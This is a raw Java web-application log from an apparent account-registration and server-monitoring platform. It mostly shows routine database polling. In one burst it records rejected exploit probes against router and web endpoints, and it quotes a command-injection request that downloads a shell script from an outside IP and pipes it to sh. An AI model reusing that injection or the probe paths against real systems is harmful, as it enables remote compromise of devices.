2025-11-20 10:26:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 0.8(BigDecimal), 3.56596(BigDecimal), 5(BigDecimal), 0(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:26:39.211018843(LocalDateTime), 2(Long)
2025-11-20 10:26:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:26:39 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 0.8%, 内存: 3.56596%, 磁盘: 5%, 网络: 0/0 KB/s
2025-11-20 10:26:39 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新所有服务器状态完成, 总数: 1, 成功: 1
2025-11-20 10:26:39 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 服务器状态刷新完成，刷新数量: 1
2025-11-20 10:26:42 [http-nio-8080-exec-2] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:26:42 [http-nio-8080-exec-2] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:26:42 [http-nio-8080-exec-2] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:26:42 [http-nio-8080-exec-2] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:26:42 [http-nio-8080-exec-2] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:26:42 [http-nio-8080-exec-2] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:26:42 [http-nio-8080-exec-2] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:26:52 [http-nio-8080-exec-3] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:26:52 [http-nio-8080-exec-3] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:26:52 [http-nio-8080-exec-3] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:26:52 [http-nio-8080-exec-3] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:26:52 [http-nio-8080-exec-3] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:26:52 [http-nio-8080-exec-3] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:26:52 [http-nio-8080-exec-3] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:27:02 [http-nio-8080-exec-4] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:27:02 [http-nio-8080-exec-4] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:27:02 [http-nio-8080-exec-4] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:27:02 [http-nio-8080-exec-4] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:27:02 [http-nio-8080-exec-4] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:27:02 [http-nio-8080-exec-4] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:27:02 [http-nio-8080-exec-4] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:27:06 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 开始执行服务器状态刷新定时任务
2025-11-20 10:27:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0
2025-11-20 10:27:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:27:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:27:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:27:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:27:06 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:27:09 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
2025-11-20 10:27:09 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 0(BigDecimal), 3.58022(BigDecimal), 5(BigDecimal), 0(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:27:09.258404250(LocalDateTime), 2(Long)
2025-11-20 10:27:09 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:27:09 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 0%, 内存: 3.58022%, 磁盘: 5%, 网络: 0/0 KB/s
2025-11-20 10:27:09 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新所有服务器状态完成, 总数: 1, 成功: 1
2025-11-20 10:27:09 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 服务器状态刷新完成，刷新数量: 1
2025-11-20 10:27:12 [http-nio-8080-exec-5] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:27:12 [http-nio-8080-exec-5] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:27:12 [http-nio-8080-exec-5] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:27:12 [http-nio-8080-exec-5] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:27:12 [http-nio-8080-exec-5] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:27:12 [http-nio-8080-exec-5] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:27:12 [http-nio-8080-exec-5] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:27:22 [http-nio-8080-exec-6] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:27:22 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:27:22 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:27:22 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:27:22 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:27:22 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:27:22 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:27:32 [http-nio-8080-exec-7] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:27:32 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:27:32 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:27:32 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:27:32 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:27:32 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:27:32 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:27:34 [http-nio-8080-exec-8] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /tmUnblock.cgi
2025-11-20 10:27:34 [http-nio-8080-exec-8] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /tmUnblock.cgi
2025-11-20 10:27:34 [http-nio-8080-exec-9] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /goform/set_LimitClient_cfg
2025-11-20 10:27:34 [http-nio-8080-exec-9] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /goform/set_LimitClient_cfg
2025-11-20 10:27:35 [http-nio-8080-exec-1] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /setup.cgi
2025-11-20 10:27:35 [http-nio-8080-exec-1] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /setup.cgi
2025-11-20 10:27:35 [http-nio-8080-exec-2] INFO  org.apache.coyote.http11.Http11Processor - Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
java.lang.IllegalArgumentException: Invalid character found in the request target [/cgi-bin/;wget${IFS}-qO-${IFS}http://74.194.191.52/rondo.sbx.sh|sh&echo${IFS} ]. The valid characters are defined in RFC 7230 and RFC 3986
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:490)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:264)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1744)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:842)
2025-11-20 10:27:35 [http-nio-8080-exec-3] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /apply_sec.cgi
2025-11-20 10:27:35 [http-nio-8080-exec-3] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /apply_sec.cgi
2025-11-20 10:27:35 [http-nio-8080-exec-4] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /goform/mp
2025-11-20 10:27:35 [http-nio-8080-exec-4] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /goform/mp
2025-11-20 10:27:35 [http-nio-8080-exec-5] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /goform/setUsbUnload/.js
2025-11-20 10:27:35 [http-nio-8080-exec-5] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /goform/setUsbUnload/.js
2025-11-20 10:27:36 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 开始执行服务器状态刷新定时任务
2025-11-20 10:27:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0
2025-11-20 10:27:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:27:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:27:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:27:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:27:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:27:36 [http-nio-8080-exec-6] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /goform/setPingInfo
2025-11-20 10:27:36 [http-nio-8080-exec-6] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /goform/setPingInfo
2025-11-20 10:27:36 [http-nio-8080-exec-7] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /cgi-bin/server/server.cgi
2025-11-20 10:27:36 [http-nio-8080-exec-7] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /cgi-bin/server/server.cgi
2025-11-20 10:27:36 [http-nio-8080-exec-8] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /diagnostic.php
2025-11-20 10:27:36 [http-nio-8080-exec-8] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /diagnostic.php
2025-11-20 10:27:36 [http-nio-8080-exec-9] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /
2025-11-20 10:27:36 [http-nio-8080-exec-9] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /
2025-11-20 10:27:36 [http-nio-8080-exec-10] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /HNAP1/
2025-11-20 10:27:36 [http-nio-8080-exec-10] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /HNAP1/
2025-11-20 10:27:37 [http-nio-8080-exec-1] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /goform/SystemCommand
2025-11-20 10:27:37 [http-nio-8080-exec-1] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /goform/SystemCommand
2025-11-20 10:27:37 [http-nio-8080-exec-2] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
2025-11-20 10:27:37 [http-nio-8080-exec-2] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
2025-11-20 10:27:37 [http-nio-8080-exec-3] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /wls-wsat/CoordinatorPortType
2025-11-20 10:27:37 [http-nio-8080-exec-3] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /wls-wsat/CoordinatorPortType
2025-11-20 10:27:37 [http-nio-8080-exec-4] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /xwiki/bin/get/Main/SolrSearch
2025-11-20 10:27:37 [http-nio-8080-exec-4] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /xwiki/bin/get/Main/SolrSearch
2025-11-20 10:27:37 [http-nio-8080-exec-5] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - JWT Filter - URI: /goform/formJsonAjaxReq
2025-11-20 10:27:37 [http-nio-8080-exec-5] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - Token无效: /goform/formJsonAjaxReq
2025-11-20 10:27:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
2025-11-20 10:27:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 0.8(BigDecimal), 3.58057(BigDecimal), 5(BigDecimal), 0(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:27:39.313220004(LocalDateTime), 2(Long)
2025-11-20 10:27:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:27:39 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 0.8%, 内存: 3.58057%, 磁盘: 5%, 网络: 0/0 KB/s
2025-11-20 10:27:39 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新所有服务器状态完成, 总数: 1, 成功: 1
2025-11-20 10:27:39 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 服务器状态刷新完成，刷新数量: 1
2025-11-20 10:27:42 [http-nio-8080-exec-6] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:27:42 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:27:42 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:27:42 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:27:42 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:27:42 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:27:42 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:27:52 [http-nio-8080-exec-7] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:27:52 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:27:52 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:27:52 [http-nio-8080-exec-7] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:27:52 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:27:52 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:27:52 [http-nio-8080-exec-7] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
